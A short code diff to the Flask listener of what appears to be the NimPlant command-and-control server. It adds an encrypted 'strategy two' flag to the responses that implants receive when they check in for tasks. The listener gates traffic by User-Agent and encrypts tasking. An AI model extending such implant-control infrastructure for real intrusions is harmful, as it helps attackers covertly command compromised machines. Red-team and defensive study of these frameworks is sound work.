@@ -140,6 +140,9 @@ def flaskListener(xor_key):
         np = np_server.getNimplantByGuid(flask.request.headers.get("X-Identifier"))
         if np is not None:
             if flask.request.headers.get("User-Agent") in allowedUserAgents:
+                # Encrypt the state of strategy
+                strategyTwoEnabledEncyrpted = encryptData(str(np_server.strategyTwoEnabled), np.cryptKey)
+
                 # Update the external IP address if it changed
                 if not np.ipAddrExt == getExternalIp(flask.request):
                     np.ipAddrExt = getExternalIp(flask.request)
@@ -148,12 +151,14 @@ def flaskListener(xor_key):
                     # There is a task - check in to update 'last seen' and return the task
                     np.checkIn()
                     task = encryptData(str(np.getNextTask()), np.cryptKey)
-                    return flask.jsonify(t=task), 200
+                    # Return task and strategy status
+                    return flask.jsonify(t=task, s2=strategyTwoEnabledEncyrpted), 200
                 else:
                     # There is no task - check in to update 'last seen'
                     if np.isActive():
                         np.checkIn()
-                    return flask.jsonify(status="OK"), 200
+                    # Return task and strategy status
+                    return flask.jsonify(status="OK", s2=strategyTwoEnabledEncyrpted), 200
             else:
                 notifyBadRequest(
                     getExternalIp(flask.request),
